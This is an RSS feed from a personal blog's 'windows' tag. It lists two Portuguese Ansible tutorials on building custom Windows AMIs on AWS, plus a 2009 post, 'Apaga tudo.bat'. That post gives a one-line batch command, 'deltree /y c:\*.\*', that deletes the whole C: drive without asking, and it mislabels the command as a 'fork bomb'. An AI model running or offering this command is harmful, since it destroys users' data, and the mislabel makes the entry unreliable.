<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>windows on Sidnei Weber</title>
    <link>https://sidneiweber.com.br/tags/windows/</link>
    <description>Recent content in windows on Sidnei Weber</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
    <lastBuildDate>Fri, 27 Dec 2019 17:04:43 +0000</lastBuildDate><atom:link href="https://sidneiweber.com.br/tags/windows/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Ansible: Criado AMI Windows personalizada na AWS (Parte 2)</title>
      <link>https://sidneiweber.com.br/ansible-criado-ami-windows-personalizada-na-aws-parte-2/</link>
      <pubDate>Fri, 27 Dec 2019 17:04:43 +0000</pubDate>
      
      <guid>https://sidneiweber.com.br/ansible-criado-ami-windows-personalizada-na-aws-parte-2/</guid>
      <description>Na parte 1 aprendemos como usar um script AWS User Data para configurar uma senha de Administrador e configurar o WinRM no Windows. Agora que sabemos como criar uma instância setando um senha especifica, vamos ao restante dos procedimentos. Vamos estruturar nosso projeto e manter as coisas organizadas.
Recursos utilizados, caso não tenha algo instalado, não funcionará :
Python 3.8.0Módulos pip: boto boto3 pywinrm  Ansible 2.9.2
Já podemos supor que você tenha o Ansible configurado corretamente para sua conta da AWS (por exemplo, boto instalado, credenciais do IAM configuradas).</description>
    </item>
    
    <item>
      <title>Ansible: Criado AMI Windows personalizada na AWS (Parte 1)</title>
      <link>https://sidneiweber.com.br/ansible-criado-ami-windows-personalizada-na-aws-parte-1/</link>
      <pubDate>Wed, 27 Nov 2019 09:13:21 +0000</pubDate>
      
      <guid>https://sidneiweber.com.br/ansible-criado-ami-windows-personalizada-na-aws-parte-1/</guid>
      <description>Quando vamos trabalhar com Ansbile usando Windows na AWS notamos que as imagens padrões do Windows não estão com o WinRM configurado e as senhas são geradas aleatoriamente usando a chave selecionada, sendo somente acessíveis alguns minutos após a instância iniciar. Conectando em uma instância Windows.
Uma alternativa é criar uma AMI personalizada com WinRM configurado e uma senha pré-definida, estando assim disponível imediatamente para uso. O primeiro passo é iniciar uma instância Windows colocando o script abaixo em User Data.</description>
    </item>
    
    <item>
      <title>Apaga tudo.bat</title>
      <link>https://sidneiweber.com.br/apaga-tudo.bat/</link>
      <pubDate>Mon, 28 Sep 2009 18:54:02 -0300</pubDate>
      
      <guid>https://sidneiweber.com.br/apaga-tudo.bat/</guid>
      <description>Fork bomb para Windows
@echo off c: deltree /y c:\*.\* </description>
    </item>
    
  </channel>
</rss>
